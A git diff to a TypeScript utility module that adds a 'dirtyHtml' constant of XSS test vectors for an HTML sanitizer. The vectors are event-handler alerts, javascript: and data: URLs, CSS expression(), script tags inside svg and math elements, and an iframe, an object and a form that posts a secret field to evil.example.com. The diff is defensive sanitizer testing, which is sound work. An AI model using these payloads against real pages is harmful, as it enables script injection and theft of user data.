@@ -147,6 +147,57 @@ export function initials(name?: string) {
   return (parts[0]?.[0] ?? "").concat(parts[1]?.[0] ?? "").toUpperCase() || name.slice(0, 2).toUpperCase();
 }
 
+// Test sanitizer
+export const dirtyHtml = `
+<div id="wrap">
+  <h1 onclick="alert('XSS!')">Hello <em>world</em></h1>
+  <p>Normal text <strong>bold</strong> and <em>italic</em>.</p>
+
+  <!-- Dangerous links -->
+  <a href="javascript:alert('XSS via href')">JS link</a>
+  <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnREFUQScpPC9zY3JpcHQ+" target="_blank">data: link</a>
+  <a href="https://example.com" target="_blank">Legit link</a>
+
+  <!-- Image/event handlers -->
+  <img src="x" onerror="alert('img onerror XSS')" />
+  <img src="https://picsum.photos/200" alt="ok" />
+
+  <!-- Inline styles & CSS url() -->
+  <p style="background-image:url(javascript:alert('css-url'));color:expression(alert('ie'));">
+    Styled text
+  </p>
+
+  <!-- Disallowed/complex embeds -->
+  <iframe src="https://evil.example.com" width="560" height="315"></iframe>
+  <object data="https://evil.example.com/payload" type="text/html"></object>
+  <video src="x" onplay="alert('video onplay')"></video>
+
+  <!-- SVG/script/mathy stuff -->
+  <svg><script>alert('svg script')</script></svg>
+  <math><mi>x</mi><script>alert('math script')</script></math>
+
+  <!-- Form posting elsewhere -->
+  <form action="https://evil.example.com/steal" method="post">
+    <input name="secret" value="top-secret" />
+    <button type="submit">Submit</button>
+  </form>
+
+  <!-- Newer HTML with events -->
+  <details ontoggle="alert('ontoggle')">
+    <summary>More</summary>
+    <p>Hidden detail</p>
+  </details>
+
+  <!-- Odd tags & comments -->
+  <marquee>Weee</marquee>
+  <custom-tag beep="boop">Custom content</custom-tag>
+  <!-- HTML comment should be removed or preserved depending on config -->
+</div>
+
+<style>body { background: red; }</style>
+<script>alert('top-level script tag')</script>
+`;
+
 // Perform shallow comparison. Does not handle nested comparisons like for objects or arrays.
 // To be used within update query utilities to identify changed fields to be updated.
 // export function getDataDiff<T>(existingData: T, newData: T): Partial<T> {
